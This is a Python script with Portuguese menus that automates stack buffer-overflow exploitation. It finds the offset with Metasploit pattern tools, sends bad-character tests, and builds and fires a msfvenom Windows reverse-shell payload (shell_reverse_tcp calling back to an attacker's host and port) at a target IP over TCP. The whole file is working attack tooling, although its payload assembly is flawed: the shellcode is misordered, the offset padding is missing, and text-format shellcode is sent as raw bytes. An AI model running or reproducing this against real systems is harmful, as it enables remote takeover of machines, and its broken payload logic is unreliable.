import socket
import os
import struct

def send_payload(target_ip, target_port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((target_ip, target_port))
        sock.send(payload)
        response = sock.recv(1024)
        print(response.decode())
    except Exception as e:
        print(f"Não foi possível conectar-se ao alvo: {target_ip}:{target_port}")
        print(f"Mensagem de erro: {str(e)}")

    sock.close()

def create_pattern_menu():
    pattern_length = int(input("Informe o tamanho do padrão: "))

    # Comando para criar o padrão com o pattern_create
    create_pattern_cmd = f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {pattern_length}"
    pattern = os.popen(create_pattern_cmd).read().strip()

    print("\nPayload criado:")
    print(pattern)

    proceed = input("Deseja continuar com o ataque? (s/n): ")
    if proceed.lower() == "s":
        target_ip = input("Informe o endereço IP do alvo: ")
        target_port = int(input("Informe a porta do alvo: "))

        send_payload(target_ip, target_port, pattern.encode())
    else:
        print("Ataque cancelado.")

def determine_offset_menu():
    pattern = input("Informe o padrão enviado anteriormente: ")
    eip_value = input("Informe o valor do EIP encontrado na aplicação: ")

    # Comando para determinar o offset com o pattern_offset
    determine_offset_cmd = f"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {eip_value}"
    offset = os.popen(determine_offset_cmd).read().strip()

    print(f"Offset encontrado: {offset}")

    target_ip = input("Informe o endereço IP do alvo: ")
    target_port = int(input("Informe a porta do alvo: "))

    # Valor fixo "BBBB"
    payload = b"BBBB"

    badchars = input("Informe os badchars a serem enviados: ")
    payload += badchars.encode()

    send_payload(target_ip, target_port, payload)

def create_payload_menu():
    print("-- Seleção de Payload --")
    print("1. Reverse Shell")

    choice = input("Escolha um payload: ")
    if choice == "1":
        lhost = input("Informe o endereço IP do atacante: ")
        lport = input("Informe a porta do atacante: ")
        badchars = input("Informe os badchars encontrados: ")

        # Comando para criar o payload reverse shell com o msfvenom
        create_payload_cmd = f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c"
        shellcode = os.popen(create_payload_cmd).read().strip()

        target_ip = input("Informe o endereço IP do alvo: ")
        target_port = int(input("Informe a porta do alvo: "))

        eip_address = input("Informe o endereço de retorno encontrado (formato: 0x10090c83): ")
        eip_value = struct.pack("<I", int(eip_address, 16))

        nop_sled = b"\x90" * 16

        payload = shellcode.encode() + nop_sled + eip_value + badchars.encode()

        print("\nPayload criado:")
        print(payload)

        proceed = input("Deseja continuar com o ataque? (s/n): ")
        if proceed.lower() == "s":
            send_payload(target_ip, target_port, payload)
        else:
            print("Ataque cancelado.")
    else:
        print("Opção inválida!")

def main_menu():
    while True:
        print("\n-- Menu Principal --")
        print("1. Criar padrão")
        print("2. Determinar offset")
        print("3. Criar payload personalizado")
        print("4. Sair")

        choice = input("Escolha uma opção: ")

        if choice == "1":
            create_pattern_menu()
        elif choice == "2":
            determine_offset_menu()
        elif choice == "3":
            create_payload_menu()
        elif choice == "4":
            print("Goodbye!")
            break
        else:
            print("Opção inválida!")

if __name__ == "__main__":
    try:
        while True:
            os.system('clear')
            main_menu()
    except KeyboardInterrupt:
        print("\nGoodbye!")
